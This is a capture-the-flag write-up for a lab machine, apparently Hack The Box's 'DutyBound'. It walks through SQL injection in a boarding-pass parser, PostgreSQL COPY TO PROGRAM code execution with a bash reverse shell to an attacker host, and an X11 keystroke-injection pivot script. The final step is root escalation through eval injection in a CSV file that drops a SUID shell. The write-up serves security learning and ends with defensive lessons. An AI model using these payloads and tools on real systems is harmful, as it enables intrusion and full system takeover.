# DutyBound

## Find Open Ports and Services Running on the Target IP

Command:

```bash
nmap -sV -sC -T4 <target_ip>
```

The scan reveals three services:

- `22/tcp` — OpenSSH 8.9p1 (Ubuntu — Jammy 22.04)
- `80/tcp` — nginx 1.18.0 (redirects to `https://airsnacks.htb/`)
- `443/tcp` — nginx 1.18.0, TLS, serving "AirSnacks Self-Checkout" (cert `commonName=airsnacks.htb`)

Add the discovered hostname to the `/etc/hosts` file:

```text
<target_ip> airsnacks.htb
```

SSH is almost certainly a post-exploitation door (needs creds), so the entire initial surface is the web app on 443.

---

## Virtual Host Enumeration

The TLS certificate only advertises a single name, but it is worth confirming there are no extra vhosts. nginx serves the same default page for any unknown `Host`, so establish the baseline response size and filter it out:

```bash
# baseline: a host that cannot exist
curl -sk https://<target_ip>/ -H "Host: nope.airsnacks.htb" -o /dev/null -w "%{size_download}\n"   # 1470

ffuf -u https://<target_ip>/ -H "Host: FUZZ.airsnacks.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -fs 1470 -k
```

No additional vhosts are found — every response collapses to the 1470-byte default page. The attack surface is confirmed to be the single `airsnacks.htb` application.

> Tip: `ffuf -ac` (auto-calibration) handles the baseline automatically and is more robust when the default page has a dynamic (changing-size) element.

---

## Enumerate the Self-Checkout Application

Fetch the landing page with headers and map the application routes:

```bash
curl -sk https://airsnacks.htb/ -D - -o body.html

for p in /browse /cart /checkout/boarding-pass /exit /health; do
  echo "== $p =="; curl -sk -o /dev/null -w "%{http_code}\n" https://airsnacks.htb$p
done
```

Key observations from the response headers:

```text
Vary: Cookie
Set-Cookie: session=; ... HttpOnly; Path=/
```

- The `session` cookie plus the `{"detail": ...}` error shape (seen later) indicate a **FastAPI / Starlette** backend with an `itsdangerous`-style signed session cookie.
- Routes discovered: `/browse`, `/cart`, `/checkout/boarding-pass`, `/exit`, `/health`.

Inspect the front-end JavaScript to learn how the checkout flow talks to the backend:

```bash
curl -sk https://airsnacks.htb/static/app.js | grep -iE 'verify|boarding|fetch|post|/cart|sku'
```

Relevant logic:

```javascript
const res = await postJSON("/cart/add", { sku: b.dataset.sku });
const pending = postJSON("/checkout/boarding-pass/verify", { raw: "" });
```

So the checkout works in two stages:

1. `POST /cart/add` with `{"sku": "..."}` to populate a cart (tracked by the session cookie).
2. `POST /checkout/boarding-pass/verify` with `{"raw": "<BCBP>"}` — the server scans a **Bar Coded Boarding Pass** to decide duty-free eligibility.

---

## Probe the Checkout Endpoints

The verify endpoint refuses to do anything without an active cart:

```bash
curl -sk -X POST https://airsnacks.htb/checkout/boarding-pass/verify \
  -H 'Content-Type: application/json' -d '{"raw":""}'
```

```json
{"detail":"no active checkout session","error":"CART_EMPTY"}
```

Pull a valid SKU from the catalogue and prime a cart, keeping a cookie jar for the session:

```bash
curl -sk https://airsnacks.htb/browse | grep -oE 'data-sku="[^"]+"' | head

SKU="SNK-NUTS"
curl -sk -c cookies -b cookies -X POST https://airsnacks.htb/cart/add \
  -H 'Content-Type: application/json' -d "{\"sku\":\"$SKU\"}"
```

```json
{"cart_id":"c_3700445b7a","cart_size":1}
```

With a non-empty cart, the `verify` endpoint will now actually parse the `raw` BCBP string.

---

## Build a Valid BCBP (IATA Resolution 792)

The endpoint parses an IATA "M1"-format Bar Coded Boarding Pass. To reach any injectable field, the mandatory structure must first pass validation. A Python builder keeps the fiddly fixed-width and hex-length fields correct:

```python
#!/usr/bin/env python3
"""Minimal IATA BCBP (Res 792, M1) builder.
The injection goes in the 'for airline use' free-text tail, which the
server concatenates into an unparameterized INSERT.

Usage:  python3 bcbp.py "AIRLINE_USE_PAYLOAD"
"""
import sys

def pad(s, n):
    return s[:n].ljust(n)

def build(airline_use: str) -> str:
    # Mandatory unique fields
    fmt   = "M"; legs = "1"
    name  = pad("DESMARAIS/LUC", 20)
    etkt  = "E"
    # Mandatory repeated fields (single leg)
    pnr   = pad("ABC123", 7)
    frm   = "YUL"; to = "FRA"
    carr  = pad("AC", 3)
    flt   = pad("0834", 5)
    jdate = "326"; cmp = "J"
    seat  = "001A"; seq = pad("0025", 5); stat = "1"

    # Conditional section
    ver_marker, ver_num = ">", "6"
    # item 10 (conditional-unique) must be one of 0B/18/25/32 -> use the 0B (11-byte) layout
    unique_data = "0" "W" "W" "6304" "B" + pad("AC", 3)   # 11 bytes -> item 10 = 0B
    # item 17 (conditional-repeated) must be one of 03/0D/0E/.. -> use 03 (airline numeric code)
    repeated_data = "014"                                 # 3 bytes -> item 17 = 03
    item10 = f"{len(unique_data):02X}"
    item17 = f"{len(repeated_data):02X}"

    conditional = (ver_marker + ver_num + item10 + unique_data +
                   item17 + repeated_data + airline_use)
    item6 = f"{len(conditional):02X}"                     # 2-hex total variable-field size
    if len(conditional) > 0xFF:
        sys.exit("[!] Payload too long: variable section exceeds 255 chars.")

    return (fmt + legs + name + etkt +
            pnr + frm + to + carr + flt + jdate + cmp + seat + seq + stat +
            item6 + conditional)

if __name__ == "__main__":
    print(build(sys.argv[1] if len(sys.argv) > 1 else ""))
```

The parser validates fields incrementally and tells you exactly what it wants. An empty conditional section is rejected:

```json
{"detail":"item 10 must be one of 0B,18,25,32; got 00","error":"BCBP_ERR_ITEM10_MISMATCH","item":10}
```

```json
{"detail":"leg 1: item 17 must be one of 03,0D,0E,0F,12,15,25,26,29,2A; got 00","error":"BCBP_ERR_ITEM17_MISMATCH","item":17}
```

- **Item 10** is the hex length of the conditional-*unique* block. `0B` (11 bytes) is the standard IATA layout: passenger description + source-of-checkin + source-of-issuance + date-of-issue(4) + document-type + issuing-airline(3).
- **Item 17** is the hex length of the conditional-*repeated* block. `03` is the smallest accepted — just the 3-char Airline Numeric Code.

The builder above already emits valid `0B` and `03` blocks, so a clean submission now validates:

```bash
BP=$(python3 bcbp.py "")
curl -sk -c cookies -b cookies -X POST https://airsnacks.htb/checkout/boarding-pass/verify \
  -H 'Content-Type: application/json' -d "{\"raw\":\"$BP\"}"
```

```json
{"audit_ref":"aud_b6a922dcacaf","dest":"FRA","eligibility_token":"eyJ...","exempt":false,"regime":"OFF_AIRPORT"}
```

---

## Discover SQL Injection in the Audit Logger

The "for airline use" free-text field at the end of the BCBP is appended to the string. Injecting a single quote there breaks a backend SQL statement:

```bash
BP=$(python3 bcbp.py "'")
curl -sk -c cookies -b cookies -X POST https://airsnacks.htb/checkout/boarding-pass/verify \
  -H 'Content-Type: application/json' -d "{\"raw\":\"$BP\"}"
```

```json
{"detail":"unterminated quoted string at or near \"''')\"\nLINE 1: ...IS/LUC', 'AC', '0834', '326', 'YUL', 'FRA', '', '', 81, ''')\n","error":"DCS_ERR_INTERNAL"}
```

The leaked query fragment shows our value is the **last column** of an `INSERT ... VALUES (..., 81, '<airline_use>')`, inside a single-quoted literal. A PostgreSQL backend is confirmed (error dialect + `DCS_ERR_INTERNAL` wrapper).

### Error-based extraction of the DB role

Because the value sits in a string literal, concatenation (`||`) lets us force a type-cast error that echoes data back in the error message:

```bash
BP=$(python3 bcbp.py "x'||CAST((SELECT current_user) AS int)||'")
curl -sk -c cookies -b cookies -X POST https://airsnacks.htb/checkout/boarding-pass/verify \
  -H 'Content-Type: application/json' -d "{\"raw\":\"$BP\"}"
```

```json
{"detail":"invalid input syntax for type integer: \"airsnacks_app\"\n","error":"DCS_ERR_INTERNAL"}
```

Casting the text role name to `int` fails, and PostgreSQL helpfully prints the offending value — leaking the current role **`airsnacks_app`**.

### Confirm a dangerous role membership

Enumerate which roles `airsnacks_app` inherits, using the same error-based primitive:

```bash
PAY="x'||CAST((SELECT string_agg(r.rolname,',') FROM pg_auth_members m JOIN pg_roles r ON m.roleid=r.oid WHERE m.member=(SELECT oid FROM pg_roles WHERE rolname=current_user)) AS int)||'"
BP=$(python3 bcbp.py "$PAY")
curl -sk -c cookies -b cookies -X POST https://airsnacks.htb/checkout/boarding-pass/verify \
  -H 'Content-Type: application/json' -d "{\"raw\":\"$BP\"}"
```

```json
{"detail":"invalid input syntax for type integer: \"pg_execute_server_program\"\n","error":"DCS_ERR_INTERNAL"}
```

The role is a member of **`pg_execute_server_program`** — not superuser, but enough for OS command execution via `COPY ... TO PROGRAM`.

---

## Remote Code Execution via COPY TO PROGRAM

`COPY ... TO PROGRAM` runs a shell command as the **postgres OS user**. Delivering it requires stacked statements, so the breakout closes the `VALUES` tuple and comments out the trailing `')`. Base64 is used to avoid nested-quote problems inside the JSON + shell + SQL layers.

Start a listener on the attacker host:

```bash
nc -lvnp 9001
```

Fire the injection (set `LHOST` to your tun0 IP):

```bash
LHOST=<attacker_ip>; LPORT=9001
RS="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
B64=$(printf '%s' "$RS" | base64 -w0)

PAY="'); COPY (SELECT 1) TO PROGRAM 'echo $B64|base64 -d|bash'; -- "
BP=$(python3 bcbp.py "$PAY")

curl -sk -c cookies -b cookies -X POST https://airsnacks.htb/cart/add \
  -H 'Content-Type: application/json' -d '{"sku":"SNK-NUTS"}' >/dev/null
curl -sk -c cookies -b cookies -X POST https://airsnacks.htb/checkout/boarding-pass/verify \
  -H 'Content-Type: application/json' -d "{\"raw\":\"$BP\"}"
```

The resulting SQL is:

```sql
... , 81, ''); COPY (SELECT 1) TO PROGRAM 'echo <b64>|base64 -d|bash'; -- ')
```

— a complete `INSERT`, then the `COPY` fires the reverse shell, then the trailing `')` is commented out. A shell returns as the `postgres` user:

```bash
id
# uid=114(postgres) gid=121(postgres) groups=121(postgres),120(ssl-cert)
```

Stabilise it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Confirm the Vulnerable Source

The application source confirms the root cause — `/opt/vrs/airsnacksdf/dcs_bridge/audit.py`:

```python
sql = (
    "INSERT INTO bp_scan_audit "
    "(audit_ref, kiosk_id, ts, pnr, pax_name, carrier, flight_no, "
    " dep_julian, origin, dest, ff_carrier, ff_number, raw_len, airline_use) "
    "VALUES ('%s', '%s', now(), '%s', '%s', '%s', '%s', '%s', "
    "'%s', '%s', '%s', '%s', %d, '%s')"
    % (audit_ref, KIOSK_ID, bp.pnr.strip(), ..., bp.airline_use)
)
cur.execute(sql)
```

Every other query in the module uses proper parameterisation (`cur.execute(sql, (params,))`). Only the audit logger builds its statement with Python `%`-formatting and drops `bp.airline_use` in unsanitised — a textbook case of the "unimportant" logging path being the one that is vulnerable.

---

# Lateral Movement

## Enumerate for a Pivot Target

Enumerate logged-in users and graphical sessions from the postgres shell:

```bash
who; w
ls -la /tmp/.X11-unix
ps aux | grep -iE 'firefox|openbox|xterm|Xorg|kiosk' | grep -v grep
```

Findings:

```text
dutyfree-kiosk  tty7   ... xinit ... /usr/bin/X :0 vt7 -nolisten tcp -auth /tmp/serverauth.XXXX
root            Xorg :0 ...
dutyfree-kiosk  openbox ...
dutyfree-kiosk  firefox --kiosk https://airsnacks.htb
```

```text
srwxrwxrwx 1 root root 0 ... /tmp/.X11-unix/X0
```

- The `dutyfree-kiosk` user is running an **Openbox** session on display `:0` with **Firefox in kiosk mode**.
- The X11 unix socket is world-accessible (`srwxrwxrwx`).

---

## Pivot to dutyfree-kiosk via Open X11 + XTEST

The X server was started with `-auth /tmp/serverauth.XXXX`, and that cookie is `-rw------- dutyfree-kiosk` — unreadable by postgres. However, the session left the display open to local connections, so authentication can be bypassed entirely. Test it:

```bash
DISPLAY=:0 python3 -c "from Xlib import display; d=display.Display(); print('OK screens=', d.screen_count())"
# OK screens= 1
```

The connection succeeds with **no cookie**. X access grants the ability to synthesise input events into another user's session, but not to spawn a process directly. Openbox provides the missing piece — `/etc/xdg/openbox/rc.xml` binds a terminal launcher:

```xml
<keybind key="C-A-t"><action name="Execute"><command>xterm</command></action></keybind>
```

So pressing **Ctrl+Alt+T** makes Openbox spawn an `xterm` *running as dutyfree-kiosk*. The following tool uses the XTEST extension to press that combo and then type an arbitrary command into the resulting terminal:

```python
#!/usr/bin/env python3
"""XTEST keystroke injection into a local X display.
Run:  DISPLAY=:0 python3 xinject.py 'COMMAND TO TYPE'
"""
import sys, time
from Xlib import X, XK, display
from Xlib.ext import xtest

def main():
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id > /tmp/pwn.txt"
    d = display.Display()
    if not d.query_extension("XTEST"):
        sys.exit("[!] XTEST not available")

    def kc(ks): return d.keysym_to_keycode(ks)
    def tap(ks, shift=False):
        if shift: xtest.fake_input(d, X.KeyPress, kc(XK.XK_Shift_L)); d.sync()
        xtest.fake_input(d, X.KeyPress, kc(ks)); d.sync()
        xtest.fake_input(d, X.KeyRelease, kc(ks)); d.sync()
        if shift: xtest.fake_input(d, X.KeyRelease, kc(XK.XK_Shift_L)); d.sync()
        time.sleep(0.02)
    def needs_shift(ch):
        ks = ord(ch); code = d.keysym_to_keycode(ks)
        if code == 0: return None, False
        if ks == d.keycode_to_keysym(code, 0): return ks, False
        if ks == d.keycode_to_keysym(code, 1): return ks, True
        return ks, False

    # Ctrl+Alt+T -> xterm
    for k in (XK.XK_Control_L, XK.XK_Alt_L, XK.XK_t): xtest.fake_input(d, X.KeyPress, kc(k)); d.sync()
    for k in (XK.XK_t, XK.XK_Alt_L, XK.XK_Control_L): xtest.fake_input(d, X.KeyRelease, kc(k)); d.sync()
    time.sleep(2.5)

    for ch in cmd:
        if ch == " ": tap(XK.XK_space); continue
        ks, sh = needs_shift(ch)
        if ks is None: continue
        tap(ks, sh)
    tap(XK.XK_Return); d.sync()

if __name__ == "__main__":
    main()
```

Transfer it to the target (host it on the attacker box, pull it from the postgres shell):

```bash
# attacker
python3 -m http.server 8000
# target (postgres shell)
cd /tmp && wget http://<attacker_ip>:8000/xinject.py
```

Confirm the pivot with a harmless probe, which should write a file as dutyfree-kiosk:

```bash
DISPLAY=:0 python3 /tmp/xinject.py 'id > /tmp/pwn.txt'
sleep 3; cat /tmp/pwn.txt
# uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)
```

Then catch an interactive shell (listener on the attacker host first):

```bash
nc -lvnp 9001
```

```bash
DISPLAY=:0 python3 /tmp/xinject.py 'bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1'
```

The shell returns as **dutyfree-kiosk**, a member of the **`pos-ops`** group.

---

## Retrieve User Flag

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat /home/dutyfree-kiosk/user.txt
```

The user flag is obtained.

---

# Privilege Escalation

## Analyse the Root-Triggered Duty-Rate Job

Enumerate the duty-rate tooling under `/opt/vrs`:

```bash
ls -la /opt/vrs/data/ /opt/vrs/bin/
cat /opt/vrs/bin/apply-duty-rates.sh
cat /opt/vrs/data/duty-rates.csv
systemctl cat vrs-duty-apply.path vrs-duty-apply.service
```

Permissions and units:

```text
drwxrwxr-x 2 root pos-ops ... /opt/vrs/data/
-rw-rw-r-- 1 root pos-ops ... /opt/vrs/data/duty-rates.csv
```

```ini
# vrs-duty-apply.path
[Path]
PathModified=/opt/vrs/data/duty-rates.csv
Unit=vrs-duty-apply.service

# vrs-duty-apply.service  (Type=oneshot, no User= -> runs as root)
[Service]
ExecStart=/opt/vrs/bin/apply-duty-rates.sh
```

The script:

```bash
#!/bin/bash
set -euo pipefail
RATES="/opt/vrs/data/duty-rates.csv"
while IFS=, read -r tax_class duty_pct vat_pct; do
    ...
    if ! [[ "$duty_pct" =~ ^[0-9]+$ && "$vat_pct" =~ ^[0-9]+$ ]]; then
        echo "rate must be numeric" >&2; exit 1
    fi
    eval "${tax_class}=${duty_pct}"   # <-- field 1 is NOT sanitised
done < "$RATES"
for req in SPIRITS WINE BEER SNACKS CONFECTIONERY; do
    if [[ -z "${!req:-}" ]]; then echo "required category ${req} missing" >&2; exit 1; fi
done
...
```

The chain:

- `duty-rates.csv` is **group-writable** by `pos-ops`, and so is its parent directory — the current user can rewrite it.
- The systemd `.path` unit watches the file and triggers the `.service` on modification.
- The `.service` runs `apply-duty-rates.sh` **as root**.
- The script forces fields 2 and 3 to be numeric, but passes field 1 (`tax_class`) straight into `eval` — arbitrary command execution as root.

---

## Craft the eval Injection

Field 1 becomes a **command-prefix assignment** inside `eval "${tax_class}=${duty_pct}"`: a leading `VAR=val` prefix, a command that runs as root, and a trailing `#` to comment out the appended `=${duty_pct}`. The original data rows are kept after the malicious row so the required-category check still passes and the script exits cleanly.

Payload line (field 1 contains the command; fields 2/3 are dummy numerics `1,1`):

```text
SPIRITS=1 bash -c 'cp /bin/bash /tmp/rootbash;chmod 4755 /tmp/rootbash' #,1,1
```

When expanded, `eval` sees:

```bash
SPIRITS=1 bash -c 'cp /bin/bash /tmp/rootbash;chmod 4755 /tmp/rootbash' #=1
```

`bash -c '...'` runs as root and drops a SUID copy of bash; `#=1` is a comment, so the statement exits 0 and `set -e` does not abort.

---

## Trigger and Obtain Root

Back up the original file, write the malicious CSV (quoted heredoc so nothing expands locally), and wait for the path unit to fire:

```bash
cp /opt/vrs/data/duty-rates.csv /tmp/duty.bak

cat > /opt/vrs/data/duty-rates.csv <<'EOF'
SPIRITS=1 bash -c 'cp /bin/bash /tmp/rootbash;chmod 4755 /tmp/rootbash' #,1,1
SPIRITS,45,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
EOF

sleep 3; ls -l /tmp/rootbash
# -rwsr-xr-x 1 root root ... /tmp/rootbash
```

Drop into root (`-p` preserves the SUID euid) and read the flag:

```bash
/tmp/rootbash -p
id        # uid=0(root)
cat /root/root.txt
```

The root flag is successfully obtained.

Restore the original rates to leave the service healthy:

```bash
cp /tmp/duty.bak /opt/vrs/data/duty-rates.csv
```

> If `/tmp/rootbash` does not appear, confirm the write landed (`cat /opt/vrs/data/duty-rates.csv`) and re-trigger with `touch /opt/vrs/data/duty-rates.csv` — the `.path` unit watches `PathModified`.

---

# Attack Chain

```text
Self-Checkout Recon (airsnacks.htb)
   → BCBP boarding-pass parser (/checkout/boarding-pass/verify)
   → SQL Injection in audit logger (airline_use field) → leak role airsnacks_app
   → role in pg_execute_server_program → COPY TO PROGRAM RCE → shell as postgres
   → open X11 (:0) + XTEST keystroke injection into Openbox → xterm as dutyfree-kiosk
   → User Flag
   → pos-ops group-writable duty-rates.csv → root systemd .path/.service
   → unsanitised eval of CSV field 1 → SUID bash → Root
```

## Key Takeaways

- **Parameterise every query, including logging.** The audit INSERT was the only unparameterised statement in the module and it was the entire foothold.
- **Minimise DB role grants.** `pg_execute_server_program` turned a string-concatenation bug into OS command execution without superuser.
- **Lock down local X11.** An open display (`:0`) lets any local account drive another user's GUI session via XTEST, regardless of file-permission boundaries on the auth cookie.
- **Never `eval` external input.** Numeric validation on two of three CSV fields created a false sense of safety; the unchecked field, writable by a non-root group and consumed by a root service, was game over.